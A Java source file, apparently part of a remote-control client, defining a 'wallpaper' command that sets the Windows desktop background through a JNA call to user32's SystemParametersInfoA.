package br.com.introcdc.connect.client.commands.control;
/*
 * Written by IntroCDC, Bruno Coêlho at 24/01/2025 - 00:22
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.FileComponents;
import com.sun.jna.Library;
import com.sun.jna.Native;
import com.sun.jna.win32.W32APIOptions;

import java.io.File;

public class ClientCommandWallpaper extends ClientCommand {

    public interface User32 extends Library {
        User32 INSTANCE = Native.load("user32", User32.class, W32APIOptions.DEFAULT_OPTIONS);

        int SystemParametersInfoA(int uiAction, int uiParam, String pvParam, int fWinIni);
    }

    public static final int SPI_SETDESKWALLPAPER = 0x0014;
    public static final int SPIF_UPDATEINIFILE = 0x01;
    public static final int SPIF_SENDCHANGE = 0x02;

    public ClientCommandWallpaper() {
        super("wallpaper");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        File wallpaperFile = FileComponents.file(input);
        if (!wallpaperFile.exists()) {
            msg("Arquivo para wallpaper não encontrado!");
            return;
        }

        String absolutePath = wallpaperFile.getAbsolutePath();
        int result = User32.INSTANCE.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, absolutePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

        if (result == 0) {
            throw new RuntimeException("Falha ao definir o wallpaper. Verifique o caminho ou permissões.");
        }
    }

}
